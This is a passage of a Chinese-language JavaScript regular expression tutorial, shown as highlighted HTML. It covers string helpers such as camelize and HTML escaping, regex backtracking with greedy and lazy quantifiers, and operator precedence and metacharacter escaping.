punctuation">(</span><span class="token regex">/(?:^|\s)\w/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">titleize</span><span class="token punctuation">(</span><span class="token string">'my name is epeli'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "My Name Is Epeli"</span>复制代码</code></pre><p>思路是找到每个单词的首字母，当然这里不使用非捕获匹配也是可以的。</p><p><strong>5.3 驼峰化</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">camelize</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[-_\s]+(.)?/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>match<span class="token punctuation">,</span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> c <span class="token operator">?</span> c<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">camelize</span><span class="token punctuation">(</span><span class="token string">'-moz-transform'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "MozTransform"</span>复制代码</code></pre><p>其中分组<code>(.)</code>表示首字母。单词的界定是，前面的字符可以是多个连字符、下划线以及空白符。正则后面的?的目的，是为了应对<code>str</code>尾部的字符可能不是单词字符，比如<code>str</code>是’-moz-transform    ‘。</p><p><strong>5.4 中划线化</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">dasherize</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/([A-Z])/g</span><span class="token punctuation">,</span> <span class="token string">'-$1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[-_\s]+/g</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">dasherize</span><span class="token punctuation">(</span><span class="token string">'MozTransform'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => "-moz-transform"</span>复制代码</code></pre><p>驼峰化的逆过程。</p><p><strong>5.5 html转义和反转义</strong></p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 将HTML特殊字符转换成等值的实体</span><span class="token keyword">function</span> <span class="token function">escapeHTML</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> escapeChars <span class="token operator">=</span> <span class="token punctuation">{</span>      <span class="token string">'¢'</span> <span class="token punctuation">:</span> <span class="token string">'cent'</span><span class="token punctuation">,</span>      <span class="token string">'£'</span> <span class="token punctuation">:</span> <span class="token string">'pound'</span><span class="token punctuation">,</span>      <span class="token string">'¥'</span> <span class="token punctuation">:</span> <span class="token string">'yen'</span><span class="token punctuation">,</span>      <span class="token string">'€'</span><span class="token punctuation">:</span> <span class="token string">'euro'</span><span class="token punctuation">,</span>      <span class="token string">'©'</span> <span class="token punctuation">:</span><span class="token string">'copy'</span><span class="token punctuation">,</span>      <span class="token string">'®'</span> <span class="token punctuation">:</span> <span class="token string">'reg'</span><span class="token punctuation">,</span>      <span class="token string">'&lt;'</span> <span class="token punctuation">:</span> <span class="token string">'lt'</span><span class="token punctuation">,</span>      <span class="token string">'>'</span> <span class="token punctuation">:</span> <span class="token string">'gt'</span><span class="token punctuation">,</span>      <span class="token string">'"'</span> <span class="token punctuation">:</span> <span class="token string">'quot'</span><span class="token punctuation">,</span>      <span class="token string">'&amp;'</span> <span class="token punctuation">:</span> <span class="token string">'amp'</span><span class="token punctuation">,</span>      <span class="token string">'\''</span> <span class="token punctuation">:</span> <span class="token string">'#39'</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">'['</span> <span class="token operator">+</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>escapeChars<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>match<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">'&amp;'</span> <span class="token operator">+</span> escapeChars<span class="token punctuation">[</span>match<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">';'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">escapeHTML</span><span class="token punctuation">(</span><span class="token string">'&lt;div>Blah blah blah&lt;/div>'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => "&amp;lt;div&amp;gt;Blah blah blah&amp;lt;/div&amp;gt";</span>复制代码</code></pre><p>其中使用了用构造函数生成的正则，然后替换相应的格式就行了，这个跟本章没多大关系。</p><p>倒是它的逆过程，使用了括号，以便提供引用，也很简单，如下：</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 实体字符转换为等值的HTML。</span><span class="token keyword">function</span> <span class="token function">unescapeHTML</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> htmlEntities <span class="token operator">=</span> <span class="token punctuation">{</span>      nbsp<span class="token punctuation">:</span> <span class="token string">' '</span><span class="token punctuation">,</span>      cent<span class="token punctuation">:</span> <span class="token string">'¢'</span><span class="token punctuation">,</span>      pound<span class="token punctuation">:</span> <span class="token string">'£'</span><span class="token punctuation">,</span>      yen<span class="token punctuation">:</span> <span class="token string">'¥'</span><span class="token punctuation">,</span>      euro<span class="token punctuation">:</span> <span class="token string">'€'</span><span class="token punctuation">,</span>      copy<span class="token punctuation">:</span> <span class="token string">'©'</span><span class="token punctuation">,</span>      reg<span class="token punctuation">:</span> <span class="token string">'®'</span><span class="token punctuation">,</span>      lt<span class="token punctuation">:</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span>      gt<span class="token punctuation">:</span> <span class="token string">'>'</span><span class="token punctuation">,</span>      quot<span class="token punctuation">:</span> <span class="token string">'"'</span><span class="token punctuation">,</span>      amp<span class="token punctuation">:</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span>      apos<span class="token punctuation">:</span> <span class="token string">'\''</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\&amp;([^;]+);/g</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>match<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> htmlEntities<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> htmlEntities<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> match<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">unescapeHTML</span><span class="token punctuation">(</span><span class="token string">'&amp;lt;div&amp;gt;Blah blah blah&amp;lt;/div&amp;gt;'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => "&lt;div>Blah blah blah&lt;/div>"</span>复制代码</code></pre><p>通过<code>key</code>获取相应的分组引用，然后作为对象的键。</p><p><strong>5.6 匹配成对标签</strong></p><p>要求匹配：</p><blockquote><title>regular expression</title><p>laoyao bye bye</p></blockquote><p>不匹配：</p><blockquote><p><title>wrong!</title></p><p></p></blockquote><p>匹配一个开标签，可以使用正则<code>&lt;[^&gt;]+&gt;</code>，</p><p>匹配一个闭标签，可以使用<code>&lt;\/[^&gt;]+&gt;</code>，</p><p>但是要求匹配成对标签，那就需要使用反向引用，如：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/&lt;([^>]+)>[\d\D]*&lt;\/\1>/</span><span class="token punctuation">;</span><span class="token keyword">var</span> string1 <span class="token operator">=</span> <span class="token string">"&lt;title>regular expression&lt;/title>"</span><span class="token punctuation">;</span><span class="token keyword">var</span> string2 <span class="token operator">=</span> <span class="token string">"&lt;p>laoyao bye bye&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">var</span> string3 <span class="token operator">=</span> <span class="token string">"&lt;title>wrong!&lt;/p>"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string1<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string2<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string3<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// false</span>复制代码</code></pre><p>其中开标签<code>&lt;[^&gt;]+&gt;</code>改成<code>&lt;([^&gt;]+)&gt;</code>，使用括号的目的是为了后面使用反向引用，而提供分组。闭标签使用了反向引用，<code>&lt;\/\1&gt;</code>。</p><p>另外<code>[\d\D]</code>的意思是，这个字符是数字或者不是数字，因此，也就是匹配任意字符的意思。</p><h3 id="第三章小结"><a href="#第三章小结" class="headerlink" title="第三章小结"></a>第三章小结</h3><p>正则中使用括号的例子那可是太多了，不一而足。</p><p>重点理解括号可以提供分组，我们可以提取数据，应该就可以了。</p><p>例子中的代码，基本没做多少分析，相信你都能看懂的。</p><h2 id="第4章-正则表达式回溯法原理"><a href="#第4章-正则表达式回溯法原理" class="headerlink" title="第4章 正则表达式回溯法原理"></a>第4章 正则表达式回溯法原理</h2><p>学习正则表达式，是需要懂点儿匹配原理的。</p><p>而研究匹配原理时，有两个字出现的频率比较高：“回溯”。</p><p>听起来挺高大上，确实还有很多人对此不明不白的。</p><p>因此，本章就简单扼要地说清楚回溯到底是什么东西。</p><p>内容包括：</p><ol><li>没有回溯的匹配</li><li>有回溯的匹配</li><li>常见的回溯形式</li></ol><h3 id="1-没有回溯的匹配"><a href="#1-没有回溯的匹配" class="headerlink" title="1. 没有回溯的匹配"></a>1. 没有回溯的匹配</h3><p>假设我们的正则是<code>/ab{1,3}c/</code>，其可视化形式是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/d92077b25d4faf8073d38999294f746c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>而当目标字符串是”abbbc”时，就没有所谓的“回溯”。其匹配过程是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/3f6e829c62fca181d818205e0e08bf73?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>其中子表达式<code>b{1,3}</code>表示“b”字符连续出现1到3次。</p><h3 id="2-有回溯的匹配"><a href="#2-有回溯的匹配" class="headerlink" title="2. 有回溯的匹配"></a>2. 有回溯的匹配</h3><p>如果目标字符串是”abbc”，中间就有回溯。</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/e58356622f6087437f33cdce7ce7bd3d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>图中第5步有红颜色，表示匹配不成功。此时<code>b{1,3}</code>已经匹配到了2个字符“b”，准备尝试第三个时，结果发现接下来的字符是“c”。那么就认为<code>b{1,3}</code>就已经匹配完毕。然后状态又回到之前的状态（即第6步，与第4步一样），最后再用子表达式<code>c</code>，去匹配字符“c”。当然，此时整个表达式匹配成功了。</p><p>图中的第6步，就是“回溯”。</p><p>你可能对此没有感觉，这里我们再举一个例子。正则是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/12da8829af2cb1d67ea78631d58be6ce?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>目标字符串是”abbbc”，匹配过程是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/dddfffaf633dd14c4eefba488f64400f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>其中第7步和第10步是回溯。第7步与第4步一样，此时<code>b{1,3}</code>匹配了两个”b”，而第10步与第3步一样，此时<code>b{1,3}</code>只匹配了一个”b”，这也是<code>b{1,3}</code>的最终匹配结果。</p><p>这里再看一个清晰的回溯，正则是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/a9e420776eb01c07979f1599e4060775?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>目标字符串是：”acd”ef，匹配过程是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/33b738b42fc9e74edc84b17479ac7000?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>图中省略了尝试匹配双引号失败的过程。可以看出<code>.*</code>是非常影响效率的。</p><p>为了减少一些不必要的回溯，可以把正则修改为<code>/&quot;[^&quot;]*&quot;/</code>。</p><h3 id="3-常见的回溯形式"><a href="#3-常见的回溯形式" class="headerlink" title="3. 常见的回溯形式"></a>3. 常见的回溯形式</h3><p>正则表达式匹配字符串的这种方式，有个学名，叫回溯法。</p><p>回溯法也称试探法，它的基本思想是：从问题的某一种状态（初始状态）出发，搜索从这种状态出发所能达到的所有“状态”，当一条路走到“尽头”的时候（不能再前进），再后退一步或若干步，从另一种可能“状态”出发，继续搜索，直到所有的“路径”（状态）都试探过。这种不断“前进”、不断“回溯”寻找解的方法，就称作“回溯法”。（copy于百度百科）。</p><p>本质上就是深度优先搜索算法。<strong>其中退到之前的某一步这一过程，我们称为“回溯”。</strong>从上面的描述过程中，可以看出，路走不通时，就会发生“回溯”。即，<strong>尝试匹配失败时，接下来的一步通常就是回溯。</strong></p><p>道理，我们是懂了。那么JS中正则表达式会产生回溯的地方都有哪些呢？</p><p><strong>3.1 贪婪量词</strong></p><p>之前的例子都是贪婪量词相关的。比如<code>b{1,3}</code>，因为其是贪婪的，尝试可能的顺序是从多往少的方向去尝试。首先会尝试”bbb”，然后再看整个正则是否能匹配。不能匹配时，吐出一个”b”，即在”bb”的基础上，再继续尝试。如果还不行，再吐出一个，再试。如果还不行呢？只能说明匹配失败了。</p><p>虽然局部匹配是贪婪的，但也要满足整体能正确匹配。否则，皮之不存，毛将焉附？</p><p>此时我们不禁会问，如果当多个贪婪量词挨着存在，并相互有冲突时，此时会是怎样？</p><p>答案是，先下手为强！因为深度优先搜索。测试如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"12345"</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/(\d{1,3})(\d{1,3})/</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => ["12345", "123", "45", index: 0, input: "12345"]</span>复制代码</code></pre><p>其中，前面的<code>\d{1,3}</code>匹配的是”123”，后面的<code>\d{1,3}</code>匹配的是”45”。</p><p><strong>3.2 惰性量词</strong></p><p>惰性量词就是在贪婪量词后面加个问号。表示尽可能少的匹配，比如：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"12345"</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/(\d{1,3}?)(\d{1,3})/</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => ["1234", "1", "234", index: 0, input: "12345"]</span>复制代码</code></pre><p>其中<code>\d{1,3}?</code>只匹配到一个字符”1”，而后面的<code>\d{1,3}</code>匹配了”234”。</p><p>虽然惰性量词不贪，但也会有回溯的现象。比如正则是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/0e29c26dd50349760d05935c5e93f07b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>目标字符串是”12345”，匹配过程是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/a2af73fc275cddf7c9c5fb5a786861c0?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>知道你不贪、很知足，但是为了整体匹配成，没办法，也只能给你多塞点了。因此最后<code>\d{1,3}?</code>匹配的字符是”12”，是两个数字，而不是一个。</p><p>3.3 <strong>分支结构</strong></p><p>我们知道分支也是惰性的，比如<code>/can|candy/</code>，去匹配字符串”candy”，得到的结果是”can”，因为分支会一个一个尝试，如果前面的满足了，后面就不会再试验了。</p><p>分支结构，可能前面的子模式会形成了局部匹配，如果接下来表达式整体不匹配时，仍会继续尝试剩下的分支。这种尝试也可以看成一种回溯。</p><p>比如正则：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/4aedaeda72a6d291b9a8685cc0170347?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>目标字符串是”candy”，匹配过程：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/d69d02dfe0712ee3d22d5bb1afcda0a2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>上面第5步，虽然没有回到之前的状态，但仍然回到了分支结构，尝试下一种可能。所以，可以认为它是一种回溯的。</p><h3 id="第四章小结"><a href="#第四章小结" class="headerlink" title="第四章小结"></a>第四章小结</h3><p>其实回溯法，很容易掌握的。</p><p>简单总结就是，正因为有多种可能，所以要一个一个试。直到，要么到某一步时，整体匹配成功了；要么最后都试完后，发现整体匹配不成功。</p><ol><li>贪婪量词“试”的策略是：买衣服砍价。价钱太高了，便宜点，不行，再便宜点。</li><li>惰性量词“试”的策略是：卖东西加价。给少了，再多给点行不，还有点少啊，再给点。</li><li>分支结构“试”的策略是：货比三家。这家不行，换一家吧，还不行，再换。</li></ol><p>既然有回溯的过程，那么匹配效率肯定低一些。相对谁呢？相对那些DFA引擎。</p><p>而JS的正则引擎是NFA，NFA是“非确定型有限自动机”的简写。</p><p>大部分语言中的正则都是NFA，为啥它这么流行呢？</p><p>答：你别看我匹配慢，但是我编译快啊，而且我还有趣哦。</p><h2 id="第5章-正则表达式的拆分"><a href="#第5章-正则表达式的拆分" class="headerlink" title="第5章 正则表达式的拆分"></a>第5章 正则表达式的拆分</h2><p>对于一门语言的掌握程度怎么样，可以有两个角度来衡量：读和写。</p><p>不仅要求自己能解决问题，还要看懂别人的解决方案。代码是这样，正则表达式也是这样。</p><p>正则这门语言跟其他语言有一点不同，它通常就是一大堆字符，而没有所谓“语句”的概念。</p><p>如何能正确地把一大串正则拆分成一块一块的，成为了破解“天书”的关键。</p><p>本章就解决这一问题，内容包括：</p><ol><li>结构和操作符</li><li>注意要点</li><li>案例分析</li></ol><h3 id="1-结构和操作符"><a href="#1-结构和操作符" class="headerlink" title="1. 结构和操作符"></a>1. 结构和操作符</h3><p>编程语言一般都有操作符。只要有操作符，就会出现一个问题。当一大堆操作在一起时，先操作谁，又后操作谁呢？为了不产生歧义，就需要语言本身定义好操作顺序，即所谓的优先级。</p><p>而在正则表达式中，操作符都体现在结构中，即由特殊字符和普通字符所代表的一个个特殊整体。</p><p>JS正则表达式中，都有哪些结构呢？</p><blockquote><p>字符字面量、字符组、量词、锚字符、分组、选择分支、反向引用。</p></blockquote><p>具体含义简要回顾如下（如懂，可以略去不看）：</p><blockquote><p><strong>字面量</strong>，匹配一个具体字符，包括不用转义的和需要转义的。比如a匹配字符”a”，又比如<code>\n</code>匹配换行符，又比如<code>\.</code>匹配小数点。</p><p><strong>字符组</strong>，匹配一个字符，可以是多种可能之一，比如<code>[0-9]</code>，表示匹配一个数字。也有<code>\d</code>的简写形式。另外还有反义字符组，表示可以是除了特定字符之外任何一个字符，比如<code>[^0-9]</code>，表示一个非数字字符，也有<code>\D</code>的简写形式。</p><p><strong>量词</strong>，表示一个字符连续出现，比如<code>a{1,3}</code>表示“a”字符连续出现3次。另外还有常见的简写形式，比如<code>a+</code>表示“a”字符连续出现至少一次。</p><p><strong>锚点</strong>，匹配一个位置，而不是字符。比如^匹配字符串的开头，又比如<code>\b</code>匹配单词边界，又比如<code>(?=\d)</code>表示数字前面的位置。</p><p><strong>分组</strong>，用括号表示一个整体，比如<code>(ab)+</code>，表示”ab”两个字符连续出现多次，也可以使用非捕获分组<code>(?:ab)+</code>。</p><p><strong>分支</strong>，多个子表达式多选一，比如<code>abc|bcd</code>，表达式匹配”abc”或者”bcd”字符子串。</p><p><strong>反向引用</strong>，比如<code>\2</code>，表示引用第2个分组。</p></blockquote><p>其中涉及到的操作符有：</p><blockquote><p>1.转义符 <code>\</code><br>2.括号和方括号 <code>(...)</code>、<code>(?:...)</code>、<code>(?=...)</code>、<code>(?!...)</code>、<code>[...]</code><br>3.量词限定符 <code>{m}</code>、<code>{m,n}</code>、<code>{m,}</code>、<code>?</code>、<code>*</code>、<code>+</code><br>4.位置和序列 <code>^</code> 、<code>$</code>、 <code>\元字符</code>、 <code>一般字符</code><br>\5. 管道符（竖杠）<code>|</code></p></blockquote><p>上面操作符的优先级从上至下，由高到低。</p><p>这里，我们来分析一个正则：</p><p><code>/ab?(c|de*)+|fg/</code></p><ol><li>由于括号的存在，所以，<code>(c|de*)</code>是一个整体结构。</li><li>在<code>(c|de*)</code>中，注意其中的量词<code>*</code>，因此<code>e*</code>是一个整体结构。</li><li>又因为分支结构“|”优先级最低，因此<code>c</code>是一个整体、而<code>de*</code>是另一个整体。</li><li>同理，整个正则分成了 <code>a</code>、<code>b?</code>、<code>(...)+</code>、<code>f</code>、<code>g</code>。而由于分支的原因，又可以分成<code>ab?(c|de*)+</code>和<code>fg</code>这两部分。</li></ol><p>希望你没被我绕晕，上面的分析可用其<a href="https://link.juejin.im/?target=http%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fjex.im%2Fregulex%2F%2523%2521embed%253Dfalse%2526flags%253D%2526re%253Dab%25253F%2528c%25257Cde%252A%2529%25252B%25257Cfg" target="_blank" rel="noopener">可视化</a>形式描述如下：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/4bb44a11e383047a027a234ee15663ad?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><h3 id="2-注意要点"><a href="#2-注意要点" class="headerlink" title="2. 注意要点"></a>2. 注意要点</h3><p>关于结构和操作符，还是有几点需要强调：</p><p><strong>2.1 匹配字符串整体问题</strong></p><p>因为是要匹配整个字符串，我们经常会在正则前后中加上锚字符<code>^</code>和<code>$</code>。</p><p>比如要匹配目标字符串”abc”或者”bcd”时，如果一不小心，就会写成<code>/^abc|bcd$/</code>。</p><p>而位置字符和字符序列优先级要比竖杠高，故其匹配的结构是：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/173e8c288f0da4ed89df597551fa80db?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>应该修改成:</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/c3bcb26f1b87e43bab1497322f5107e5?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p><strong>2.2 量词连缀问题</strong></p><p>假设，要匹配这样的字符串：</p><blockquote><p>\1. 每个字符为a、b、c任选其一</p><p>\2. 字符串的长度是3的倍数</p></blockquote><p>此时正则不能想当然地写成<code>/^[abc]{3}+$/</code>，这样会报错，说<code>+</code>前面没什么可重复的：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/a852f1068a8b2051bda5c75882c98f76?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>此时要修改成：</p><p><img src="https://user-gold-cdn.xitu.io/2017/7/19/678d0621feb4bdcea899a6f61628a521?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p><strong>2.3 元字符转义问题</strong></p><p>所谓元字符，就是正则中有特殊含义的字符。</p><p>所有结构里，用到的元字符总结如下：</p><blockquote><p><code>**^**</code> <code>**$**</code> <code>**.**</code> <code>*****</code> <code>**+**</code> <code>**?**</code> <code>**|**</code> <code>**\**</code> <code>**/**</code> <code>**(**</code> <code>**)**</code> <code>**[**</code> <code>**]**</code> <code>**{**</code> <code>**}**</code> <code>**=**</code> <code>**!**</code> <code>**:**</code> <code>**-**</code> <code>**,**</code></p></blockquote><p>当匹配上面的字符本身时，可以一律转义：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"^$.*+?|\\/[]{}=!:-,"</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\^\$\.\*\+\?\|\\\/\[\]\{\}\=\!\:\-\,/</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> regex<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => true</span>复制代码</code></pre><p>其中<code>string</code>中的<code>\</code>字符也要转义的。</p><p>另外，在<code>string</code>中，也可以把每个字符转义，当然，转义后的结果仍是本身：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"^$.*+?|\\/[]{}=!:-,"</span><span class="token punctuation">;</span><span class="token keyword">var</span> string2 <span class="token operator">=</span> <span class="token string">"\^\$\.\*\+\?\|\\\/\[\]\{\}\=\!\:\-\,"</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string <span class="token operator">==</span> string2 <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => true</span>复制代码</code></pre><p>现在的问题是，是不是每个字符都需要转义呢？否，看情况。</p><p><strong>2.3.1 字符组中的元字符</strong></p><p>跟字符组相关的元字符有<code>[]</code>、<code>^</code>、<code>-</code>。因此在会引起歧义的地方进行转义。例如开头的<code>^</code>必须转义，不然会把整个字符组，看成反义字符组。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"^$.*+?|\\/[]{}=!:-,"</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/[\^$.*+?|\\/\[\]{}=!:\-,]/g</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> string<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// => ["^", "$", ".", "*", "+", "?", "|", "\", "/", "[", "]", "{", "}", "=", "!", ":", "-", ","]</span>复制代码</code></pre><p><strong>2.3.2 匹配“[abc]”和“{3,5}”</strong></p><p>我们知道<code>[abc]</code>，是个字符组。如果要匹配字符串”[abc]”时，该怎么办？</p><p>可以写成<code>/\[abc\]/</code>，也可以写成<code>/\[abc]/</code>，测试如下：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> string <span class="token operator">=</span> <span class="token string">"[abc]"</span><span class="token punctuation">;</span><span class="token keyword">var</span> regex <span class="token operator">=</span> <span class="token regex">/\[abc]/g</span><span class="token 